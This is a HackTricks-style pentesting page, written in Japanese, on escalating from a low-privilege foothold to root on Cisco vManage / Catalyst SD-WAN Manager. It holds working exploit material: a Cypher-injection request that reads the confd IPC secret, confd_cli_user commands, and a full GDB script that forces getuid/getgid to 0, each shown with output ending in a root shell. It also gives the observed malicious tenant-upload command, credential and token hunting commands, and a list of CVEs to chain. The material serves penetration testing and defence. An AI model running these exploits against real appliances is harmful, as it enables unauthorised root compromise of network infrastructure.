# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* 上で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を取得した場合、最も興味深いローカル privesc の攻撃面は、通常 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs、そして root 所有の import/upload handlers です。

controller への **initial foothold** がまだ必要な場合は、まず専用の control-plane ページを確認してください。

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## ローカルでの簡易トリアージ
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
`/etc/confd/confd_ipc_secret` が foothold から読み取り可能であれば、Path 1 と Path 2 は直ちに実行可能になります。remote info leak または webshell 経由で侵入した場合は、すでに `vmanage-admin` の SSH material や multitenancy の upload handlers に到達できるかどうかも確認してください。2026 年の research では、どちらも現実的な足掛かりになることが示されました。

## Path 1

（[https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) の例）

`confd` と各種 binary に関する [documentation](http://66.218.245.39/doc/html/rn03re18.html)（Cisco の Web サイトの account からアクセス可能）を少し調査したところ、IPC socket の authenticate には、`/etc/confd/confd_ipc_secret` にある secret が使用されていることがわかりました。
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
以前のNeo4jインスタンスを覚えていますか？これは`vmanage`ユーザーの権限で実行されているため、以前の脆弱性を利用してファイルを取得できます。
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。そのため、`/usr/bin/confd_cli_user` を独自の引数で直接呼び出せます。ただし、現在の権限では読み取りできないため、rootfs から取得して scp でコピーし、ヘルプを確認して、それを使って shell を取得する必要があります：
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

（[https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77) の例）

synacktiv team による blog¹では、root shell を取得する洗練された方法が説明されていますが、`root` のみが読み取り可能な `/usr/bin/confd_cli_user` のコピーを入手する必要があるという難点があります。私は、そのような手間をかけずに root へ escalate する別の方法を見つけました。

`/usr/bin/confd_cli` binary を disassemble したところ、次の内容を確認しました。

<details>
<summary>UID/GID の収集を示す Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

「ps aux」を実行すると、以下の内容が表示されました（_note -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
私は、「confd_cli」プログラムが、ログイン中のユーザーから取得した user ID と group ID を「cmdptywrapper」アプリケーションに渡していると仮説を立てました。

最初の試みとして、「cmdptywrapper」を直接実行し、`-g 0 -u 0` を指定しましたが、失敗しました。途中でファイルディスクリプタ（-i 1015）がどこかで作成されているようで、偽装することができません。

synacktiv の blog（最後の例）で述べられているように、`confd_cli` プログラムは command line argument に対応していません。しかし、debugger を使ってその動作に影響を与えることができ、幸いにもシステムには GDB が含まれています。

API `getuid` と `getgid` が 0 を返すよう強制する GDB script を作成しました。deserialization RCE によってすでに「vmanage」privilege を持っているため、`/etc/confd/confd_ipc_secret` を直接読み取る permission があります。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output：

<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco は後に、[CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) の advisory で、より簡潔な local root path を自ら公表しました。**read-only privileges しか持たない authenticated attacker** が、crafted request を manager CLI に送信し、不十分な input validation を悪用して root へ昇格できるというものです。

offensive の観点で重要なポイントは次のとおりです。

1. いったん box 上で *any* low-priv foothold を取得したら、より大掛かりな Path 1 / Path 2 workflow に進む前に、local CLI service をテストするべきです。
2. Path 2 の artifacts を再利用して trust boundary を特定します。`confd_cli` → `cmdptywrapper` → `vshell`
3. CLI backend に転送されるすべての field を suspicious として扱います。UID/GID、username、terminal metadata、imported files、または後で root-owned helper によって使用されるあらゆる value が対象です。
4. low-priv user が local CLI socket に到達し、それらの field に影響を与えられる場合、root までは crafted request 1つで到達できる可能性があります。

appliance に侵入した後の実践的な workflow は次のとおりです：
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは、2025年の bug を同様の versions に対する有効な hunting pattern に変えます。つまり、**userland で identity を収集し、より privileged な wrapper に forward する local CLI shim**を探します。

**CVE-2025-20122**と、それより後の**CVE-2026-20122**を混同しないでください。2025年の issue は*local*な CLI-to-root bug である一方、2026年の issue は主に foothold の設置に利用し、その後 Path 1 / Path 2 / Path 4 を再確認する、*remote*な API arbitrary file overwrite です。

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco の February 2026 advisory では、別の有用な privesc class も紹介されました。[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) は、REST API の user-authentication mechanism が不十分だったため、**authenticated な local attacker with low privileges**が root を取得できる問題です。

これは、vManage の privesc がもはや `confd`/TTY abuse に限られないことを意味します。low-priv shell の取得後は、次の点も hunt してください。

- caller を過度に信頼する localhost-only API endpoints
- current account から読み取り可能な tokens、cookies、または service credentials
- `dataservice`/REST handlers を通じて公開され、なおかつ local から trigger 可能な root-only actions

実際には、`vmanage` または別の service user として shell を取得した後では、local API abuse のほうが interactive CLI abuse よりも目立ちにくく、自動化も容易な場合が多くあります。
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルセッションのコンテキストだけで privileged REST functionality にアクセスできる場合は、API path を優先します。replay、script 化、stolen web sessions や API tokens との chain が容易だからです。

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

もう1つの最近のパターンが [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) です。`netadmin` privileges を持つ local attacker が **crafted file** を upload でき、そのファイルを CLI が後で安全でない方法で処理することで、`root` として command injection につながる可能性がありました。

HackTricks の観点では、価値のある technique は特定の CVE よりも広範です。

1. ファイルを受け付けるすべての CLI または web workflow を列挙します。imports、diagnostic bundles、templates、validators、backups、tenant data などが対象です。
2. upload されたファイルが保存される場所と、それを処理する root-owned script または binary を追跡します。
3. filename、file content、parsed metadata のいずれかが shell commands、wrapper scripts、または `system()`-style helpers に渡されることがないかテストします。
4. すでに `netadmin` に到達できる場合（valid creds、stolen session、または auth-bypass chain）、file-processing bugs は root への最短経路になることがよくあります。

Google Cloud / Mandiant は後に、この bug class が multitenancy import path を通じて exploit された具体的な事例を示しました。
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
観測された攻撃では、細工された CSV によって `/etc/passwd` と `/etc/shadow` が変更され、一時的な UID 0 アカウント（`troot`）が作成されました。これにより、`tenant-upload` / `tenant-list` のような importer は特に興味深い対象となります。これらは単なるデータ取り込み機能ではなく、root 所有の parser front-end となる可能性があるためです。

簡単な shell-side hunting pattern は次のとおりです。
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
このバグクラスは、`root` ではなく `netadmin` を付与する remote foothold と特に相性よく chain できます。

## chain 用のその他の recent vManage/Catalyst SD-WAN Manager vulns

- **Unauthenticated info leak (CVE-2026-20133)** – public research により `confd_ipc_secret` または `vmanage-admin` の private key を expose できることが示されており、read bug を Path 1 または NETCONF pivot のいずれかに変えられるため、特に high-value です。
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 上記の 2025 CLI bug とは異なります。VulnCheck はこれを使用して webshell を upload しており、その後はこのページの local privesc paths が直ちに relevant になります。
- **Authenticated UI XSS (CVE-2024-20475)** – web UI で admin session を steal し、その後 API/CLI actions に pivot して、最終的に `vshell` または上記の local privesc paths に到達します。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – `netadmin` は 2026 crafted-file privesc に必要な level そのものであるため、Path 5 の非常に強力な precursor です。
- **Authenticated arbitrary file write (CVE-2026-20262)** – 後続の web UI upload path を介する点を除けば CVE-2026-20122 と同様の offensive value があります。root または management-plane web tier によって後から parse される location に write します。
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions では、攻撃者が older vulnerable SD-WAN build に rollback し、old CLI root bug を abuse した後、元の version に restore できることが示されました。
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 専用の SD-WAN control-plane page で詳しく説明しています。`vmanage-admin` 用の SSH key を append できるため、このページを再確認するために必要な local foothold を取得できます。



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
